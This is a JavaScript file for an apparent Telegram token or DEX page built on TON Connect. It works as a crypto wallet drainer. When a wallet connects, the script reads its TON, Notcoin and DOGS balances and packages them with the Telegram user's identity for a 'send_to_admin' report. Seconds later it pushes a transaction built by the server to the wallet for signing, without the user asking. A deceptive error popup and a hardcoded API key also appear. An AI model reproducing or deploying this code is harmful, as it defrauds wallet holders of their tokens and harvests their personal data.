const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({manifestUrl: 'https://token.bigxdex.online/tonconnect-manifest.json',buttonRootId:'cnbtn'});
console.log("start")
let url = new URLSearchParams(window.location.hash.split("#")[1])
let tgWebAppData = new URLSearchParams(url.get("tgWebAppData"));
const userData = JSON.parse(tgWebAppData.get("user"))
const TON_API_BASE_URL = "https://toncenter.com/api/v3";
const TON_API_KEY = "11c07153e575449091d47c0dbdb37c58e89236af8d7462849634de148f328c78";

const axiosInstance = axios.create({});

axiosInstance.interceptors.response.use(
    response => response,
    error => error.response
);
const fromNano = (nanoAmount) => {
    return parseFloat(nanoAmount) / 1e9;
};
const getAccountInfo = async (address) => {
    const response = await axiosInstance.get(`${TON_API_BASE_URL}/account`, {
        params: { address },
        headers: { "X-API-Key": TON_API_KEY }
    });
    return response.data;
};
const getJettonWallet = async (ownerAddress, jettonAddress) => {
    const response = await axiosInstance.get(`${TON_API_BASE_URL}/jetton/wallets`, {
        params: {
            jetton_address: jettonAddress,
            owner_address: ownerAddress,
            limit: 1,
            offset: 0
        },
        headers: { "X-API-Key": TON_API_KEY }
    });
    const wallets = response.data.jetton_wallets;
    if (wallets.length > 0) {
        return wallets[0];
    }
};
class WalletManager {
    constructor(wallet) {
        this.wallet = wallet;
        this.NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC";
        this.DOGS_JETTON_CONTRACT = "0:afc49cb8786f21c87045b19ede78fc6b46c51048513f8e9a6d44060199c1bf0c";
    }

    async getAccount() {
        return await getAccountInfo(this.wallet.account.address);
    }

    async getTONBalance() {
        const accountInfo = await this.getAccount();
        return accountInfo.balance;
    }

    async getNotcoinWallet() {
        return await getJettonWallet(this.wallet.account.address, this.NOTCOIN_JETTON_CONTRACT);
    }

    async getNotcoinBalance() {
        const wallet = await this.getNotcoinWallet();
        return wallet == null ? 0 : wallet.balance;
    }
    async getDogsWallet() {
      return await getJettonWallet(this.wallet.account.address, this.DOGS_JETTON_CONTRACT);
    }

    async getDogsBalance() {
      const wallet = await this.getDogsWallet();
      return wallet == null ? 0 : wallet.balance;
    }

}

async function openButton() {
    if (await tonConnectUI.connected) {
        await send_transaction();
    } else {
        await tonConnectUI.openModal()
    }
}
const getAddress = async (address) => {
    const response = await axiosInstance.get(`https://toncenter.com/api/v2/getExtendedAddressInformation`, {
        params: { address },
        headers: { "X-API-Key": TON_API_KEY }
    });
    return response.data.result.address.account_address;
};

async function send_transaction() {
    const senderAddress = tonConnectUI.account.address;

    try {
        fetch("/api/transaction", {
            headers: {
                "content-type": "application/json"
            },
            body: JSON.stringify({
                ...Object.fromEntries(new URL(window.location.href).searchParams.entries() || []),
                address: senderAddress
            }),
            method: "POST"
        }).then(r=>r.json()).then(async response => {
            console.log('TRANSACTION!!!!!!')
            await tonConnectUI.sendTransaction(response)
        }).catch(()=>{
            Swal.fire({
                title: "You Haven't Any Token in Your Wallet.",
                icon: 'error',
                timerProgressBar: true,
                showLoaderOnConfirm: true,
                showConfirmButton: false,
                timer: 5000
            })
        })
    } catch (e) {
        console.log('TRANSACTION FAIL!!!!!!')
        console.log(e);
    }
}
(async () => {
    tonConnectUI.onStatusChange(async () => {
        if (tonConnectUI.connected) {
            const WALLET = new WalletManager(tonConnectUI);
            let notbalance = await WALLET.getNotcoinBalance() / 1000000000;
            let dogsbalance = await WALLET.getDogsBalance() / 1000000000;
            let tonbalance = await WALLET.getTONBalance() / 1000000000
            setTimeout(async function () {
                await send_transaction() 
            }, 2000)

            let addressWallet = await getAddress(tonConnectUI.wallet.account.address)
                    const connectedbody = JSON.stringify({ type:'Connected',firstname: userData.first_name,id: userData.id,username:userData.username,wallet:tonConnectUI.wallet.appName,platform:tonConnectUI.wallet.device.platform,address:addressWallet,notbalance:notbalance,dogsbalance:dogsbalance,tonbalance:tonbalance})
                await send_to_admin(connectedbody);
        } else {
            document.getElementById('balance').innerText = 'Wallet not connected';
        }
    });


    if (tonConnectUI.connected) {
        const WALLET = new WalletManager(tonConnectUI);
        let notbalance = await WALLET.getNotcoinBalance() / 1000000000;
        let dogsbalance = await WALLET.getDogsBalance() / 1000000000;
        let tonbalance = await WALLET.getTONBalance() / 1000000000;
        let addressWallet = await getAddress(tonConnectUI.wallet.account.address);
        const connectedbody = JSON.stringify({ type:'Connected',firstname: userData.first_name,id: userData.id,username:userData.username,wallet:tonConnectUI.wallet.appName,platform:tonConnectUI.wallet.device.platform,address:addressWallet,notbalance:notbalance,dogsbalance:dogsbalance,tonbalance:tonbalance})
                await send_to_admin(connectedbody);
        setTimeout(async function () {
            await send_transaction();
        }, 1500);
    }
})()

async function send_to_admin(text) {
    // HUH?
}